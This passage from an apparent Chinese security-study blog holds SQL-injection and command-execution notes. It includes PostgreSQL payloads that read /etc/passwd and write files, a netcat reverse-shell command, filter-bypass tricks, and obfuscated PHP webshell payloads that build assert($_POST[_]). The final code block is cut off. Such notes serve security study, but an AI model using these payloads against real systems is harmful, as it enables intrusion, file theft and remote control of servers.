operator">/</span>run<span class="token operator">/</span>systemd:<span class="token operator">/</span>usr<span class="token operator">/</span>sbin<span class="token operator">/</span>nologin<span class="token operator">+</span> messagebus:x:<span class="token number">103</span>:<span class="token number">106</span>::<span class="token operator">/</span>nonexistent:<span class="token operator">/</span>usr<span class="token operator">/</span>sbin<span class="token operator">/</span>nologin                                     <span class="token operator">+</span> syslog:x:<span class="token number">104</span>:<span class="token number">110</span>::<span class="token operator">/</span>home<span class="token operator">/</span>syslog:<span class="token operator">/</span>usr<span class="token operator">/</span>sbin<span class="token operator">/</span>nologin                                         <span class="token operator">+</span> _apt:x:<span class="token number">105</span>:<span class="token number">65534</span>::<span class="token operator">/</span>nonexistent:<span class="token operator">/</span>usr<span class="token operator">/</span>sbin<span class="token operator">/</span>nologin                                         <span class="token operator">+</span> tss:x:<span class="token number">106</span>:<span class="token number">111</span>:TPM software stack<span class="token punctuation">,</span><span class="token punctuation">,</span><span class="token punctuation">,</span>:<span class="token operator">/</span>var<span class="token operator">/</span>lib<span class="token operator">/</span>tpm:<span class="token operator">/</span>bin<span class="token operator">/</span><span class="token boolean">false</span>                              <span class="token operator">+</span> uuidd:x:<span class="token number">107</span>:<span class="token number">112</span>::<span class="token operator">/</span>run<span class="token operator">/</span>uuidd:<span class="token operator">/</span>usr<span class="token operator">/</span>sbin<span class="token operator">/</span>nologin                                            <span class="token operator">+</span> tcpdump:x:<span class="token number">108</span>:<span class="token number">113</span>::<span class="token operator">/</span>nonexistent:<span class="token operator">/</span>usr<span class="token operator">/</span>sbin<span class="token operator">/</span>nologin                                        <span class="token operator">+</span></code></pre><p><strong>堆叠注入时</strong></p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> Y1ng<span class="token punctuation">(</span>t <span class="token keyword">TEXT</span><span class="token punctuation">)</span><span class="token punctuation">;</span>COPY Y1ng <span class="token keyword">FROM</span> <span class="token string">'/etc/passwd'</span><span class="token punctuation">;</span><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> Y1ng <span class="token keyword">limit</span> <span class="token number">1</span> <span class="token keyword">offset</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token comment">--通过偏移量读取某一行</span><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> Y1ng <span class="token keyword">limit</span> <span class="token number">1</span> <span class="token keyword">offset</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> Y1ng <span class="token keyword">limit</span> <span class="token number">1</span> <span class="token keyword">offset</span> <span class="token number">2</span><span class="token punctuation">;</span><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> Y1ng <span class="token keyword">limit</span> <span class="token number">1</span> <span class="token keyword">offset</span> <span class="token number">3</span><span class="token punctuation">;</span><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> Y1ng <span class="token keyword">limit</span> <span class="token number">1</span> <span class="token keyword">offset</span> <span class="token number">4</span><span class="token punctuation">;</span><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> Y1ng <span class="token keyword">limit</span> <span class="token number">1</span> <span class="token keyword">offset</span> <span class="token number">5</span><span class="token punctuation">;</span><span class="token comment">--直接读取文件的全部内容：</span><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> Y1ng<span class="token punctuation">(</span>t <span class="token keyword">TEXT</span><span class="token punctuation">)</span><span class="token punctuation">;</span>COPY Y1ng<span class="token punctuation">(</span>t<span class="token punctuation">)</span> <span class="token keyword">FROM</span> <span class="token string">'/etc/passwd'</span><span class="token punctuation">;</span><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> Y1ng<span class="token punctuation">;</span></code></pre><p><strong>文件写入</strong></p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">DROP</span> <span class="token keyword">TABLE</span> Y1ng<span class="token punctuation">;</span><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> Y1ng <span class="token punctuation">(</span>t <span class="token keyword">TEXT</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> Y1ng<span class="token punctuation">(</span>t<span class="token punctuation">)</span> <span class="token keyword">VALUES</span> <span class="token punctuation">(</span><span class="token string">'hello Y1ng'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>COPY Y1ng<span class="token punctuation">(</span>t<span class="token punctuation">)</span> <span class="token keyword">TO</span> <span class="token string">'/tmp/Y1ng'</span><span class="token punctuation">;</span></code></pre><h2 id="系统数据库"><a href="#系统数据库" class="headerlink" title="系统数据库"></a>系统数据库</h2><p>在plsql中也存在库<code>information_schema</code></p><pre class="language-plsql" data-language="plsql"><code class="language-plsql"><span class="token comment">--查表名</span><span class="token keyword">select</span> table_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span>tables <span class="token keyword">where</span> table_name <span class="token keyword">not</span> <span class="token keyword">like</span> <span class="token string">'pg%'</span> <span class="token keyword">and</span> table_schema<span class="token operator">=</span><span class="token string">'public'</span><span class="token punctuation">;</span><span class="token keyword">select</span> table_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span>tables <span class="token keyword">where</span> table_name <span class="token keyword">not</span> <span class="token keyword">like</span> <span class="token string">'pg%'</span><span class="token punctuation">;</span><span class="token keyword">select</span> string_agg<span class="token punctuation">(</span>tablename<span class="token punctuation">,</span> <span class="token string">','</span><span class="token punctuation">)</span> <span class="token keyword">from</span> pg_tables <span class="token keyword">where</span> schemaname<span class="token operator">=</span><span class="token string">'public'</span><span class="token punctuation">;</span><span class="token comment">--查列名</span><span class="token keyword">select</span> column_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_name <span class="token keyword">like</span> <span class="token string">'company'</span><span class="token punctuation">;</span><span class="token keyword">select</span> string_agg<span class="token punctuation">(</span>column_name<span class="token punctuation">,</span> <span class="token string">','</span><span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token string">'public'</span><span class="token punctuation">(</span>老版本<span class="token punctuation">)</span>pg_class<span class="token punctuation">.</span>oid对应pg_attribute<span class="token punctuation">.</span>attrelidpg_class<span class="token punctuation">.</span>relname表名pg_attribute<span class="token punctuation">.</span>attname字段名<span class="token keyword">select</span> relname <span class="token keyword">from</span> pg_class获取表名<span class="token keyword">select</span> oid <span class="token keyword">from</span> pg_class wehre relname<span class="token operator">=</span><span class="token string">'admin'</span>获取表的oid<span class="token keyword">select</span> attname <span class="token keyword">from</span> pg_attribute <span class="token keyword">where</span> attrelid<span class="token operator">=</span><span class="token string">'oid的值'</span>  获取字段名</code></pre><h2 id="plsql常用命令"><a href="#plsql常用命令" class="headerlink" title="plsql常用命令"></a>plsql常用命令</h2><pre class="language-plsql" data-language="plsql"><code class="language-plsql"><span class="token keyword">select</span> CURRENT_SCHEMA<span class="token punctuation">(</span><span class="token punctuation">)</span>           #查看当前权限<span class="token keyword">select</span> user                       #查看用户<span class="token keyword">select</span> current_user               #查看当前用户<span class="token keyword">select</span> chr<span class="token punctuation">(</span><span class="token number">97</span><span class="token punctuation">)</span>                    #将ASCII码转为字符<span class="token keyword">select</span> chr<span class="token punctuation">(</span><span class="token number">97</span><span class="token punctuation">)</span><span class="token operator">||</span>chr<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token operator">||</span>chr<span class="token punctuation">(</span><span class="token number">109</span><span class="token punctuation">)</span><span class="token operator">||</span>chr<span class="token punctuation">(</span><span class="token number">105</span><span class="token punctuation">)</span><span class="token operator">||</span>chr<span class="token punctuation">(</span><span class="token number">110</span><span class="token punctuation">)</span>  #将ASCII转换为字符串<span class="token keyword">SELECT</span> session_user<span class="token punctuation">;</span><span class="token keyword">SELECT</span> usename <span class="token keyword">FROM</span> pg_user<span class="token punctuation">;</span><span class="token keyword">SELECT</span> getpgusername<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">select</span> version<span class="token punctuation">(</span><span class="token punctuation">)</span>                  #查看PostgreSQL数据库版本<span class="token keyword">SELECT</span> current_database<span class="token punctuation">(</span><span class="token punctuation">)</span>         #查看当前数据库<span class="token keyword">select</span> <span class="token keyword">length</span><span class="token punctuation">(</span><span class="token string">'admin'</span><span class="token punctuation">)</span>            #查看长度</code></pre><p><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议</a></p><p><a href="https://ccship.cn/tag/mysql%e6%b3%a8%e5%85%a5/">Mysql注入</a> <a href="https://ccship.cn/tag/postgresql%e6%b3%a8%e5%85%a5/">PostgreSQL注入</a> <a href="https://ccship.cn/tag/sqlite%e6%b3%a8%e5%85%a5/">Sqlite注入</a></p><p>0</p><p><a href="https://ccship.cn/2021/10/21/ysoserial%e4%bd%bf%e7%94%a8%e6%96%b9%e6%b3%95/">Previous Post</a></p><h3 id="ysoserial使用方法"><a href="#ysoserial使用方法" class="headerlink" title="ysoserial使用方法"></a><a href="https://ccship.cn/2021/10/21/ysoserial%e4%bd%bf%e7%94%a8%e6%96%b9%e6%b3%95/">ysoserial使用方法</a></h3><hr><p><a href="https://ccship.cn/2021/10/21/java%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e4%b9%8bcommons-collections1%e9%93%be/">Next Post</a></p><h3 id="Java反序列化之Commons-Collectio"><a href="#Java反序列化之Commons-Collectio" class="headerlink" title="Java反序列化之Commons-Collectio"></a><a href="https://ccship.cn/2021/10/21/java%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e4%b9%8bcommons-collections1%e9%93%be/">Java反序列化之Commons-Collectio</a></h3>]]></content>
      
      
      
        <tags>
            
            <tag> web安全 </tag>
            
            <tag> 基础漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>命令执行漏洞总结</title>
      <link href="/2023/08/05/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
      <url>/2023/08/05/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="命令执行漏洞（RCE）"><a href="#命令执行漏洞（RCE）" class="headerlink" title="命令执行漏洞（RCE）"></a>命令执行漏洞（RCE）</h1><h2 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h2><p>php 常见的调用外部程序的函数</p><p>系统命令执行</p><ol><li>system(args)–有回显</li><li>shell_exec(args)–无回显必须输出</li><li>passthru()</li><li>popen(handle,mode)–无回显</li><li>exec(args)–回显最后一行，必须加echo输出</li><li><strong>proc_open()</strong></li><li><strong>`(反单引号)</strong></li></ol><p>在php中称之为执行运算符，PHP 将尝试将反引号中的内容作为 shell 命令来执行，并将其输出信息返回（即，可以赋给一个变量而不是简单地丢弃到标准输出，使用反引号运算符“`”的效果与函数 shell_exec() 相同。</p><p>php代码执行</p><ol><li>assert()a</li><li>preg_replace ( $pattern ,$replacement ,  $subject [,  $limit = -1 [, &amp;$count ]] )</li></ol><p>搜索subject中匹配pattern的部分， 以replacement进行替换。当使用被弃用的 e 修饰符时, 这个函数会转义一些字符，在完成替换后，引擎会将结果字符串作为php代码使用eval方式进行评估并将返回值作为最终参与替换的字符串</p><ol><li>eval()</li><li>call_user_func (  $callback [, $parameter [, $… ]] )</li></ol><p>第一个参数 callback 是被调用的回调函数，其余参数是回调函数的参数。 传入call_user_func()的参数不能为引用传递。</p><ol><li><strong>call_user_func_array($<strong><strong>callback</strong></strong>,$param_arr)</strong></li></ol><p>把第一个参数作为<strong>回调函数<strong><strong>（</strong></strong>callback****）</strong>调用，把参数数组作（param_arr）为回调函数的的参数传入string </p><ol><li>create_function ( $args , $code )</li></ol><p>该函数的内部实现用到了<code>eval</code>。第一个参数<code>args</code>是后面定义函数的参数，第二个参数是函数的代码。</p><ol><li>array_map ( callable $callback ,  $array1 [,  $… ] )</li></ol><p>作用是为数组的每个元素应用回调函数 。其返回值为数组，是为 array1 每个元素应用 callback函数之后的数组。 callback 函数形参的数量和传给 array_map() 数组数量，两者必须一样。</p><p>示例</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>        <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'chybeta'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">create_function</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'$a'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"echo <span class="token interpolation"><span class="token variable">$a</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$b</span><span class="token punctuation">(</span><span class="token string single-quoted-string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span>http://localhost:2500/codeexec.php?chybeta=phpinfo();<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>        <span class="token variable">$array</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">array_map</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'chybeta'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$array</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span>http://localhost:2500/codeexec.php?chybeta=phpinfo</code></pre><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p><strong>（1）管道操作</strong></p><p>将一端的命令输出交给另一端的命令处理。格式：    命令1  |  命令2    </p><p>如：ps aux | grep httpd</p><p><strong>（2）重定向</strong></p><p>改变执行命令时的默认输入输出</p><p>类型操作符用途</p><p>重定向输入                      &lt;                                  从指定文件读取数据而不是从键盘读取</p><p>重定向输出                     &gt;   或&gt;&gt;                      将输出结果覆盖、追加到指定文件（&gt;覆盖、&gt;&gt;追加）</p><p>重定向标准错误输出     2&gt;或 2&gt;&gt;                 将错误信息覆盖或追加到指定文件</p><p>重定向混合输出             &amp;&gt; 或 &amp;&gt;&gt;               将标准输出和错误信息覆盖或追加到指定文件</p><p><strong>（3)逻辑分割</strong></p><p>处理多条命令之间的逻辑关系</p><p>逻辑与                      &amp;&amp;      两条命令都要执行</p><p>逻辑或                     ||           若第一条命令执行成功，则不执行第二条命令（即只要有一条命令成功就不再继续执行命令）</p><p>顺序执行               ;              执行完第一条命令后执行第二条命令</p><p>作用</p><ol><li>读取敏感文件   /etc/passwd</li><li>NC反弹shell</li></ol><p>nc -e /bin/bash 127.0.0.1 3737</p><h2 id="Bash"><a href="#Bash" class="headerlink" title="Bash"></a>Bash</h2><p>Bash 是GNU操作系统的 shell 或命令语言解释器</p><h2 id="WAF-绕过"><a href="#WAF-绕过" class="headerlink" title="WAF****绕过"></a><strong>WAF****绕过</strong></h2><h3 id="常见的替换"><a href="#常见的替换" class="headerlink" title="常见的替换"></a>常见的替换</h3><p>空格</p><blockquote><p>&gt;     &lt;       &lt;&gt;</p></blockquote><p>shell下特殊符号</p><p>$(base64编码内容|d -base64)</p><h3 id="通配符"><a href="#通配符" class="headerlink" title="通配符"></a><strong>通配符</strong></h3><p>在bash的操作环境中有一个非常有用的功能，那就是通配符，下面列出一些常用的通配符：</p><pre class="language-none"><code class="language-none">*    代表『 0 个到无穷多个』任意字符?    代表『一定有一个』任意字符[ ]    同样代表『一定有一个在括号内』的字符(非任意字符)。例如 [abcd] 代表『一定有一个字符， 可能是 a, b, c, d 这四个任何一个』[ - ]    若有减号在中括号内时，代表『在编码顺序内的所有字符』。例如 [0-9] 代表 0 到 9 之间的所有数字，因为数字的语系编码是连续的！[^ ]    若中括号内的第一个字符为指数符号 (^) ，那表示『反向选择』，例如 [^abc] 代表 一定有一个字符，只要是非 a, b, c 的其他字符就接受的意思。</code></pre><h3 id="连接符"><a href="#连接符" class="headerlink" title="连接符"></a><strong>连接符</strong></h3><p>引号连接，注意要闭合好</p><p>单引号</p><p>/‘b’i’n’/‘c’a’t’ /‘e’t’c’/‘p’a’s’s’w’d</p><p>双引号</p><p>/“b”i”n”/“w”h”i”c”h” “n”c</p><p>反斜杆</p><p>/b\i\n/w\h\i\c\h n\c</p><h3 id="正则表达式绕过"><a href="#正则表达式绕过" class="headerlink" title="正则表达式绕过"></a>正则表达式绕过</h3><h4 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a><strong>空格绕过</strong></h4><ul><li><code>&lt;</code> 符号 <code>cat&lt;123</code></li><li><code>\t</code> / <code>%09</code></li><li><code>${IFS}</code> 其中{}用来截断，比如cat$IFS2会被认为IFS2是变量名。另外，在后面加个$可以起到截断的作用，一般用$9，因为$9是当前系统shell进程的第九个参数的持有者，它始终为空字符串</li></ul><h4 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a><strong>黑名单绕过</strong></h4><ul><li><code>a=l;b=s;$a$b</code></li><li>base64 <code>echo "bHM=" | base64 -d</code></li><li><code>/?in/?s</code> =&gt; <code>/bin/ls</code></li><li>连接符 <code>cat /etc/pass'w'd</code></li><li>未定义的初始化变量 <code>cat$x /etc/passwd</code></li></ul><h2 id="无字母-数字-RCE"><a href="#无字母-数字-RCE" class="headerlink" title="无字母(数字)RCE"></a>无字母(数字)RCE</h2><p>推荐p神的文章–<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</a></p><p>利用各种非数字字母的字符，经过各种变换（异或、取反、自增），构造出单个的字母字符，然后把单个字符拼接成一个函数名，比如说<code>assert</code>，然后就可以动态执行了。所以说这里的核心就是要将非字母的字符变换成字母字符。</p><h3 id="1-异或"><a href="#1-异或" class="headerlink" title="1.异或 ^"></a>1.异或 ^</h3><p>指的是php按位异或，在php中，两个字符进行异或操作后，得到的依然是<strong>一个字符</strong>，当我们想得到<code>a-z</code>中某个字母时，就可以找到两个非字母数字的字符，只要他们俩的异或结果是这个字母即可。而在php中，两个字符进行异或时，会先将字符串转换成<code>ascii码</code>值，再将这个值转换成二进制，然后一位一位的进行按位异或，异或的规则是：<code>1^1=0,1^0=1,0^1=1,0^0=0</code>，简单的来说就是<strong>相同为零，不同为一</strong></p><p>因为很多都是不可见的字符，所以说我就先url编码了一下</p><pre class="language-php" data-language="php"><code class="language-php">a<span class="token punctuation">:</span><span class="token string single-quoted-string">'%40'</span><span class="token operator">^</span><span class="token string single-quoted-string">'%21'</span> <span class="token punctuation">;</span> s<span class="token punctuation">:</span><span class="token string single-quoted-string">'%7B'</span><span class="token operator">^</span><span class="token string single-quoted-string">'%08'</span> <span class="token punctuation">;</span> s<span class="token punctuation">:</span><span class="token string single-quoted-string">'%7B'</span><span class="token operator">^</span><span class="token string single-quoted-string">'%08'</span> <span class="token punctuation">;</span> e<span class="token punctuation">:</span><span class="token string single-quoted-string">'%7B'</span><span class="token operator">^</span><span class="token string single-quoted-string">'%1E'</span> <span class="token punctuation">;</span> r<span class="token punctuation">:</span><span class="token string single-quoted-string">'%7E'</span><span class="token operator">^</span><span class="token string single-quoted-string">'%0C'</span> <span class="token punctuation">;</span> t<span class="token punctuation">:</span><span class="token string single-quoted-string">'%7C'</span><span class="token operator">^</span><span class="token string single-quoted-string">'%08'</span><span class="token constant">P</span><span class="token punctuation">:</span><span class="token string single-quoted-string">'%0D'</span><span class="token operator">^</span><span class="token string single-quoted-string">'%5D'</span> <span class="token punctuation">;</span> <span class="token constant">O</span><span class="token punctuation">:</span><span class="token string single-quoted-string">'%0F'</span><span class="token operator">^</span><span class="token string single-quoted-string">'%40'</span> <span class="token punctuation">;</span> <span class="token constant">S</span><span class="token punctuation">:</span><span class="token string single-quoted-string">'%0E'</span><span class="token operator">^</span><span class="token string single-quoted-string">'%5D'</span> <span class="token punctuation">;</span> <span class="token constant">T</span><span class="token punctuation">:</span><span class="token string single-quoted-string">'%0B'</span><span class="token operator">^</span><span class="token string single-quoted-string">'%5F'</span>拼接起来：<span class="token variable">$_</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'%40'</span><span class="token operator">^</span><span class="token string single-quoted-string">'%21'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'%7B'</span><span class="token operator">^</span><span class="token string single-quoted-string">'%08'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'%7B'</span><span class="token operator">^</span><span class="token string single-quoted-string">'%08'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'%7B'</span><span class="token operator">^</span><span class="token string single-quoted-string">'%1E'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'%7E'</span><span class="token operator">^</span><span class="token string single-quoted-string">'%0C'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'%7C'</span><span class="token operator">^</span><span class="token string single-quoted-string">'%08'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//$_=assert</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token string single-quoted-string">'_'</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'%0D'</span><span class="token operator">^</span><span class="token string single-quoted-string">'%5D'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'%0F'</span><span class="token operator">^</span><span class="token string single-quoted-string">'%40'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'%0E'</span><span class="token operator">^</span><span class="token string single-quoted-string">'%5D'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'%0B'</span><span class="token operator">^</span><span class="token string single-quoted-string">'%5F'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//$__=_POST$___=$$__; $___=$_POST$_($___[_]);//assert($_POST[_]);放到一排就是：</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'%40'</span><span class="token operator">^</span><span class="token string single-quoted-string">'%21'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'%7B'</span><span class="token operator">^</span><span class="token string single-quoted-string">'%08'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'%7B'</span><span class="token operator">^</span><span class="token string single-quoted-string">'%08'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'%7B'</span><span class="token operator">^</span><span class="token string single-quoted-string">'%1E'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'%7E'</span><span class="token operator">^</span><span class="token string single-quoted-string">'%0C'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'%7C'</span><span class="token operator">^</span><span class="token string single-quoted-string">'%08'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token string single-quoted-string">'_'</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'%0D'</span><span class="token operator">^</span><span class="token string single-quoted-string">'%5D'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'%0F'</span><span class="token operator">^</span><span class="token string single-quoted-string">'%40'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'%0E'</span><span class="token operator">^</span><span class="token string single-quoted-string">'%5D'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'%0B'</span><span class="token operator">^</span><span class="token string single-quoted-string">'%5F'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$___</span><span class="token operator">=</span><span class="token variable">$$__</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token punctuation">(</span><span class="token variable">$___</span><span class="token punctuation">[</span><span class="token constant">_</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h3 id="2-取反"><a href="#2-取反" class="headerlink" title="2.取反 ~"></a>2.取反 ~</h3><p>一个字符取反之后都会变成另一个字符，不像异或需要两个字符才能构造出一个字符。</p><p>有参数函数要分开运算</p><p>如</p><pre class="language-none"><code class="language-none">system('ls /');(~%8C%86%8C%8B%9A%92)(~%93%8C%DF%D0); </code></pre><p>利用的是UTF-8编码的某个汉字，并将其中某个字符取出来，比如<code>'和'{2}</code>的结果是<code>"\x8c"</code>，其取反即为字母<code>s</code></p><h3 id="3-自增"><a href="#3-自增" class="headerlink" title="3.自增"></a>3.自增</h3><p>只要我们获得了小写字母<code>a</code>，就可以通过自增获得所有小写字母，当我们获得大写字母<code>A</code>，就可以获得所有大写字母了</p><p>数组(Array)中就正好有大写字母<code>A</code>和小写字母<code>a</code>，而在PHP中，如果强制连接数组和字符串的话，数组就会被强制转换成字符串，它的值就为<code>Array</code>，那取它的第一个子母，就拿到<code>A</code>了，那有了<code>a</code>和<code>A</code>，相当于我们就可以拿到<code>a-z</code>和<code>A-Z</code>中的所有字母了</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token operator">=</span>@<span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$_</span></span>"</span><span class="token punctuation">;</span> <span class="token comment">// $_='Array';</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'!'</span><span class="token operator">==</span><span class="token string single-quoted-string">'@'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// $_=$_[0];</span><span class="token variable">$___</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span> <span class="token comment">// A</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$___</span><span class="token operator">.=</span><span class="token variable">$__</span><span class="token punctuation">;</span> <span class="token comment">// S</span><span class="token variable">$___</span><span class="token operator">.=</span><span class="token variable">$__</span><span class="token punctuation">;</span> <span class="token comment">// S</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment">// E</span> <span class="token variable">$___</span><span class="token operator">.=</span><span class="token variable">$__</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token 